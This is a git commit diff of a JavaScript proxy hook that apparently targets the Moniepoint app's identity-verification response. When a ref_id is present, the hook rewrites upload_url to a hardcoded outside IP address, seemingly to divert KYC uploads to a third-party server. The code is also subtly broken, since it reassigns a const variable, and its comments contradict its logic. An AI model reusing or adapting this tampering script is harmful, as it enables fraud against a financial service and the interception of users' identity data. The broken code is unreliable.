ee8b46d2356a26ee2b32fffc2076c53673bb1c2a
prince <62496012+Prince-cool@users.noreply.github.com>
2024-11-16 21:54:40 +0800

    Update hook.js

--- Moniepoint/Javascript/hook.js
+++ Moniepoint/Javascript/hook.js
@@ -8,10 +8,15 @@
 //   body = JSON.stringify(obj);
 const body = $response.body; // 获取响应体
 var obj = JSON.parse(body); // 将响应体解析为JSON对象
-ref_id=obj.ref_id;
-obj.upload_url='http://120.76.203.201/a';
-console.log(ref_id);
-$done({
-  "body": obj,
-  "status": 200
-});
+// 检查JSON对象中是否存在reference键和provider是否为"SMILE_ID"
+if (obj.ref_id) {
+    ref_id=obj.ref_id;
+    obj.upload_url='http://120.76.203.201/a';
+    console.log(ref_id);
+    body = JSON.stringify(obj);
+    $done({body}); // 如果不符合条件，返回原始响应体
+} else {
+    $done({body}); // 如果不符合条件，返回原始响应体
+}
+
+
